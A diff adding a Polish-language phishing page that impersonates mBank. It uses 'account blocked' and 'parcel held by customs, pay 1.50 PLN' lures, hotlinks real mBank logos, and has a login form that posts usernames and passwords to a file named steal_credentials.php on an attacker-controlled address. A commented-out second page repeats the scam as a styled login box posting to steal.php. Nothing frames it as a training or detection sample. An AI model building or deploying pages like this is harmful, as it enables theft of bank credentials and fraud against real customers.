@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Szybka dopłata do paczki - mBank</title>
+</head>
+<body>
+
+    <h1>Twój panel płatności mBank</h1>
+    <p>Uwaga! Twoje <strong>zablokowane konto</strong> wymaga natychmiastowej akcji. <strong>Zweryfikuj tożsamość</strong>.</p>
+    <p>Wymagana <strong>dopłata</strong> w kwocie 1.50 PLN, aby Twoja <strong>paczka zatrzymana</strong> przez urząd celny ruszyła dalej.</p>
+
+    <form action="http://192.168.1.55/steal_credentials.php" method="POST">
+        <label>Login:</label>
+        <input type="text" name="login"><br><br>
+        <label>Hasło:</label>
+        <input type="password" name="password"><br><br>
+        <button type="submit">Zaloguj bezpiecznie i zapłać</button>
+    </form>
+
+    <div style="margin-top: 50px;">
+        <img src="https://www.mbank.pl/images/logo.png" alt="mBank">
+        <img src="https://www.mbank.pl/images/banner1.jpg" alt="mBank Promo">
+        <img src="https://www.mbank.pl/images/secure-icon.png" alt="Bezpieczne połączenie">
+    </div>
+
+</body>
+</html>
+
+<!--
+   <!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>mBank - Logowanie</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; }
+        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+        button { width: 95%; padding: 10px; background: #ff5a00; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>Zaloguj się do mBanku</h2>
+    <p style="color: red; font-size: 12px;"><strong>Uwaga!</strong> Twoje konto zostało zablokowane. Zweryfikuj tożsamość i podaj hasło.</p>
+    
+    <form action="http://192.168.1.55/steal.php" method="POST">
+        <input type="text" placeholder="Identyfikator" required>
+        <input type="password" placeholder="Hasło" required>
+        <button type="submit">Dalej</button>
+    </form>
+</div>
+
+</body>
+</html>
+    !--->
